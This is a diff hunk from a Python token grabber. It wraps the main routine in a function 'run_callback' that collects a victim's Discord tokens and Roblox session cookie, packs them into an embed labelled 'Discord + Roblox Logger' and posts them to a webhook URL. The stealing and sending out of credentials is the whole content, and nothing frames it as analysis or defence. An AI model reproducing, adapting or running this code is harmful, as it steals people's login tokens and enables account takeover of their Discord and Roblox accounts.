@@ -86,20 +86,20 @@ def get_roblox_cookie():
                 os.remove(destination_path)
             except:
                 pass
-
-if __name__ == "__main__":
-    discord_token = get_discord_tokens()
-    roblox_token = get_roblox_cookie()
+def run_callback():
+    if __name__ == "__main__":
+        discord_token = get_discord_tokens()
+        roblox_token = get_roblox_cookie()
     
-    embed = {
-        "title": "Discord + Roblox Logger",
-        "color": 0x5865F2,
-        "timestamp": datetime.utcnow().isoformat(),
-        "fields": [
-            {"name": "Discord Token", "value": f"```{discord_token if discord_token else 'Not found'}```", "inline": False},
-            {"name": "Roblox Cookie", "value": f"```{roblox_token if roblox_token else 'Not found'}```", "inline": False}
-        ],
-        "footer": {"text": "Made by Hyper and Sensai Ryzen"}
-    }
+        embed = {
+            "title": "Discord + Roblox Logger",
+            "color": 0x5865F2,
+            "timestamp": datetime.utcnow().isoformat(),
+            "fields": [
+                {"name": "Discord Token", "value": f"```{discord_token if discord_token else 'Not found'}```", "inline": False},
+                {"name": "Roblox Cookie", "value": f"```{roblox_token if roblox_token else 'Not found'}```", "inline": False}
+            ],
+            "footer": {"text": "Made by Hyper and Sensai Ryzen"}
+        }
     
-    requests.post(WEBHOOK_URL, json={"embeds": [embed]})
+        requests.post(WEBHOOK_URL, json={"embeds": [embed]})
